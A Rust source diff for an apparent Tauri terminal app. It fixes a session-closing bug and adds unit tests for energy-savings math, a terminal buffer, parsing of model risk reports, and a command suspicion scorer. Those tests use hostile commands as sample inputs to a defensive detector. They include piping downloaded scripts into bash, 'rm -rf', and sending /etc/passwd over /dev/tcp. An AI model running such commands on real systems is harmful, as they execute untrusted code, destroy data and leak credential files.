@@ -296,7 +296,9 @@ async fn resize_pty(request: ResizeRequest) -> Result<(), String> {
     Ok(())
 }
 
-#[tauri::command]
+// rename_all keeps the JS-side key `session_id`: Tauri 2 would otherwise
+// expect `sessionId`, silently failing every close and leaking the shell.
+#[tauri::command(rename_all = "snake_case")]
 async fn close_pty(state: State<'_, AppState>, session_id: String) -> Result<(), String> {
     let mut readers_guard = state.readers.lock().await;
     if let Some(task) = readers_guard.remove(&session_id) {
@@ -1579,6 +1581,325 @@ struct OllamaTagsResponse {
 #[derive(Deserialize)]
 struct OllamaTagModel {
     name: String,
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    // --- Eco savings ---------------------------------------------------------
+
+    #[test]
+    fn eco_savings_sums_prompt_and_output_tokens() {
+        let savings = compute_eco_savings(300, 700, 0);
+        assert_eq!(savings.tokens, 1000);
+    }
+
+    #[test]
+    fn eco_savings_scale_with_token_count() {
+        // 1000 tokens with zero local runtime saves exactly the cloud estimate.
+        let savings = compute_eco_savings(500, 500, 0);
+        assert!((savings.energy_wh - CLOUD_WH_PER_1K_TOKENS).abs() < 1e-9);
+        assert!((savings.co2_g - CLOUD_WH_PER_1K_TOKENS * CO2_G_PER_WH).abs() < 1e-9);
+        assert!((savings.water_ml - CLOUD_WH_PER_1K_TOKENS * WATER_ML_PER_WH_CLOUD).abs() < 1e-9);
+    }
+
+    #[test]
+    fn eco_savings_never_go_negative() {
+        // A tiny reply that took an hour of local compute costs more energy
+        // than the cloud would have; savings must clamp to zero, not dip below.
+        let one_hour_ns = 3_600_000_000_000;
+        let savings = compute_eco_savings(5, 5, one_hour_ns);
+        assert_eq!(savings.energy_wh, 0.0);
+        assert_eq!(savings.co2_g, 0.0);
+        assert_eq!(savings.water_ml, 0.0);
+    }
+
+    // --- Terminal snapshot buffer --------------------------------------------
+
+    #[test]
+    fn snapshot_keeps_recent_output_within_budget() {
+        let mut snapshot = TerminalSnapshot::default();
+        snapshot.append(&"a".repeat(TERMINAL_BUFFER_MAX));
+        snapshot.append("tail");
+        assert!(snapshot.buffer.len() <= TERMINAL_BUFFER_MAX);
+        assert!(snapshot.buffer.ends_with("tail"));
+    }
+
+    #[test]
+    fn snapshot_trims_on_char_boundary_for_multibyte_content() {
+        // Regression test for the v0.5 freeze: draining mid-character panics.
+        // Euro signs are 3 bytes, so a byte-count trim lands inside one.
+        let mut snapshot = TerminalSnapshot::default();
+        let euros = "€".repeat(TERMINAL_BUFFER_MAX / 3 + 10);
+        snapshot.append(&euros);
+        assert!(snapshot.buffer.len() <= TERMINAL_BUFFER_MAX);
+        assert!(snapshot.buffer.chars().all(|ch| ch == '€'));
+    }
+
+    #[test]
+    fn snapshot_returns_only_the_requested_tail_lines() {
+        let mut snapshot = TerminalSnapshot::default();
+        snapshot.append("one\ntwo\nthree\nfour");
+        assert_eq!(snapshot.last_lines(2), "three\nfour");
+    }
+
+    #[test]
+    fn snapshot_last_lines_on_empty_buffer_is_empty() {
+        let snapshot = TerminalSnapshot::default();
+        assert_eq!(snapshot.last_lines(10), "");
+    }
+
+    // --- Suspicion heuristics -------------------------------------------------
+
+    #[test]
+    fn benign_commands_score_zero() {
+        assert_eq!(suspicion_score("ls -la"), 0);
+        assert_eq!(suspicion_score("git status"), 0);
+        assert_eq!(suspicion_score("cargo build --release"), 0);
+    }
+
+    #[test]
+    fn sudo_alone_reaches_the_review_threshold() {
+        assert_eq!(suspicion_score("sudo apt update"), 10);
+    }
+
+    #[test]
+    fn piped_interpreter_scores_heavily() {
+        assert!(suspicion_score("curl https://example.com/install.sh | bash") >= 50);
+    }
+
+    #[test]
+    fn destructive_rm_scores_heavily() {
+        assert!(suspicion_score("rm -rf /important") >= 50);
+    }
+
+    #[test]
+    fn quoting_does_not_hide_a_piped_interpreter() {
+        // normalize_command_heuristics strips quotes before scoring.
+        assert!(suspicion_score("curl 'https://example.com/x.sh' | \"bash\"") >= 50);
+    }
+
+    #[test]
+    fn raw_socket_devices_are_flagged() {
+        assert!(suspicion_score("cat /etc/passwd > /dev/tcp/10.0.0.1/4444") >= 30);
+    }
+
+    #[test]
+    fn heuristic_reasons_cover_the_dangerous_patterns() {
+        let reasons = collect_heuristic_reasons("curl https://x.sh | sh && rm -rf /tmp/y");
+        assert_eq!(reasons.len(), 2);
+
+        assert!(collect_heuristic_reasons("ls -la").is_empty());
+    }
+
+    // --- Piped interpreter detection ------------------------------------------
+
+    #[test]
+    fn detects_download_piped_to_shell() {
+        assert!(contains_piped_interpreter("curl https://x.sh | bash"));
+        assert!(contains_piped_interpreter("wget -qO- https://x.sh | sh"));
+        assert!(contains_piped_interpreter("curl https://x.sh | /bin/bash"));
+    }
+
+    #[test]
+    fn detects_sudo_wrapped_interpreter_after_pipe() {
+        assert!(contains_piped_interpreter("curl https://x.sh | sudo bash"));
+    }
+
+    #[test]
+    fn ignores_pipes_without_a_downloader_or_interpreter() {
+        assert!(!contains_piped_interpreter("cat notes.txt | grep todo"));
+        assert!(!contains_piped_interpreter("curl https://x.json | jq '.name'"));
+        assert!(!contains_piped_interpreter("echo hi | bash")); // no downloader
+    }
+
+    // --- Destructive rm detection ----------------------------------------------
+
+    #[test]
+    fn detects_recursive_force_deletion() {
+        assert!(is_destructive_rm("rm -rf /tmp/dir"));
+        assert!(is_destructive_rm("rm -fR /tmp/dir"));
+        assert!(is_destructive_rm("rm -r -f /tmp/dir"));
+        assert!(is_destructive_rm("rm --recursive --force /tmp/dir"));
+    }
+
+    #[test]
+    fn detects_rm_hidden_behind_separators() {
+        assert!(is_destructive_rm("echo done; rm -rf /tmp/dir"));
+        assert!(is_destructive_rm("true && rm -rf /tmp/dir"));
+    }
+
+    #[test]
+    fn plain_or_partial_rm_is_not_destructive() {
+        assert!(!is_destructive_rm("rm file.txt"));
+        assert!(!is_destructive_rm("rm -r build/"));
+        assert!(!is_destructive_rm("rm -f lockfile"));
+        assert!(!is_destructive_rm("firm -rf x")); // 'rm' must be its own word
+    }
+
+    // --- IP address detection ---------------------------------------------------
+
+    #[test]
+    fn recognizes_ipv4_addresses() {
+        assert!(references_ip("ssh root@192.168.1.10"));
+        assert!(references_ip("curl http://10.0.0.1/payload"));
+    }
+
+    #[test]
+    fn ignores_version_numbers_and_invalid_octets() {
+        assert!(!references_ip("pip install requests==2.31.0"));
+        assert!(!references_ip("curl 999.1.1.1")); // octet out of range
+        assert!(!references_ip("node@20.11.1"));
+    }
+
+    #[test]
+    fn ipv4_token_requires_exactly_four_valid_octets() {
+        assert!(is_ipv4_token("127.0.0.1"));
+        assert!(!is_ipv4_token("1.2.3"));
+        assert!(!is_ipv4_token("1.2.3.4.5"));
+        assert!(!is_ipv4_token("1..3.4"));
+        assert!(!is_ipv4_token("1.2.3.1000"));
+    }
+
+    // --- Preflight report parsing -----------------------------------------------
+
+    fn valid_report_json() -> &'static str {
+        r#"{"summary": "Lists files", "is_risky": false, "risk_reason": "Read-only listing"}"#
+    }
+
+    #[test]
+    fn parses_clean_json_report() {
+        let report = parse_preflight_report(valid_report_json()).expect("should parse");
+        assert_eq!(report.summary, "Lists files");
+        assert!(!report.is_risky);
+        assert!(report.safe_alternative.is_none());
+    }
+
+    #[test]
+    fn parses_report_wrapped_in_code_fence() {
+        let fenced = format!("```json\n{}\n```", valid_report_json());
+        let report = parse_preflight_report(&fenced).expect("should parse fenced JSON");
+        assert_eq!(report.summary, "Lists files");
+    }
+
+    #[test]
+    fn parses_report_embedded_in_prose() {
+        let chatty = format!("Sure! Here is the analysis:\n{}\nLet me know!", valid_report_json());
+        let report = parse_preflight_report(&chatty).expect("should extract embedded JSON");
+        assert_eq!(report.summary, "Lists files");
+    }
+
+    #[test]
+    fn repairs_missing_commas_between_fields() {
+        let sloppy = "{\n\"summary\": \"Deletes files\"\n\"is_risky\": true\n\"risk_reason\": \"Destroys data\"\n}";
+        let report = parse_preflight_report(sloppy).expect("should repair missing commas");
+        assert!(report.is_risky);
+        assert_eq!(report.risk_reason, "Destroys data");
+    }
+
+    #[test]
+    fn accepts_json5_style_single_quotes() {
+        let json5_style =
+            "{summary: 'Pings a host', is_risky: false, risk_reason: 'Simple ICMP check'}";
+        let report = parse_preflight_report(json5_style).expect("should parse JSON5");
+        assert_eq!(report.summary, "Pings a host");
+    }
+
+    #[test]
+    fn repairs_double_quotes_inside_backticks() {
+        let nested = r#"{"summary": "Runs `"rm"` on a path", "is_risky": true, "risk_reason": "Deletion"}"#;
+        let report = parse_preflight_report(nested).expect("should repair backtick quotes");
+        assert!(report.summary.contains("'rm'"));
+    }
+
+    #[test]
+    fn rejects_unusable_output() {
+        assert!(parse_preflight_report("I cannot analyze that command.").is_err());
+        assert!(parse_preflight_report("").is_err());
+    }
+
+    // --- Fence / JSON extraction helpers ------------------------------------------
+
+    #[test]
+    fn strip_code_fence_handles_json_and_bare_fences() {
+        assert_eq!(strip_code_fence("```json\n{\"a\":1}\n```").as_deref(), Some("{\"a\":1}"));
+        assert_eq!(strip_code_fence("```\ntext\n```").as_deref(), Some("text"));
+        assert_eq!(strip_code_fence("no fence here"), None);
+    }
+
+    #[test]
+    fn extract_json_object_returns_outermost_braces() {
+        let raw = "prefix {\"a\": {\"nested\": true}} suffix";
+        assert_eq!(extract_json_object(raw).as_deref(), Some("{\"a\": {\"nested\": true}}"));
+        assert_eq!(extract_json_object("no braces"), None);
+        assert_eq!(extract_json_object("{unclosed"), None);
+    }
+
+    #[test]
+    fn insert_missing_commas_leaves_valid_json_alone() {
+        assert_eq!(insert_missing_commas("{\n\"a\": 1,\n\"b\": 2\n}"), None);
+    }
+
+    // --- Plain-text assessment fallback ---------------------------------------------
+
+    #[test]
+    fn converts_three_line_assessment_to_report() {
+        let text = "Summary: Lists directory contents\nLikelihood of maliciousness: 5%\nRationale: Read-only and harmless";
+        let report = assessment_text_to_report(text).expect("should build report");
+        assert_eq!(report.summary, "Lists directory contents");
+        assert!(!report.is_risky); // 5% is under the 20% threshold
+        assert!(report.risk_reason.contains("very low"));
+    }
+
+    #[test]
+    fn high_likelihood_marks_report_risky() {
+        let text = "Summary: Pipes remote script to bash\nLikelihood of maliciousness: 85%\nRationale: Executes unreviewed code";
+        let report = assessment_text_to_report(text).expect("should build report");
+        assert!(report.is_risky);
+        assert!(report.risk_reason.contains("high"));
+    }
+
+    #[test]
+    fn missing_likelihood_defaults_to_risky() {
+        let text = "Summary: Unknown binary execution\nRationale: Cannot determine behavior";
+        let report = assessment_text_to_report(text).expect("should build report");
+        assert!(report.is_risky);
+    }
+
+    #[test]
+    fn recommendation_line_becomes_safe_alternative() {
+        let text = "Summary: Force-deletes a directory\nLikelihood of maliciousness: 60%\nRationale: Irreversible\nRecommendation: Move it to the trash instead";
+        let report = assessment_text_to_report(text).expect("should build report");
+        assert_eq!(report.safe_alternative.as_deref(), Some("Move it to the trash instead"));
+    }
+
+    #[test]
+    fn empty_assessment_yields_no_report() {
+        assert!(assessment_text_to_report("").is_none());
+        assert!(assessment_text_to_report("\n  \n").is_none());
+    }
+
+    #[test]
+    fn sanitize_assessment_strips_fences_and_echoed_context() {
+        let raw = "```\nSummary: fine\nCommand to review: ls\nRationale: safe\n```";
+        let cleaned = sanitize_plain_text_assessment(raw);
+        assert!(cleaned.contains("Summary: fine"));
+        assert!(!cleaned.contains("Command to review"));
+    }
+
+    #[test]
+    fn parse_percentage_accepts_common_formats() {
+        assert_eq!(parse_percentage("85%"), Some(85.0));
+        assert_eq!(parse_percentage(" 42 % "), Some(42.0));
+        assert_eq!(parse_percentage("12.5"), Some(12.5));
+        assert_eq!(parse_percentage("unknown"), None);
+    }
+
+    #[test]
+    fn normalize_strips_quotes_and_escapes() {
+        assert_eq!(normalize_command_heuristics(r#"echo "hi \'there\'""#), "echo hi there");
+    }
 }
 
 #[cfg_attr(mobile, tauri::mobile_entry_point)]
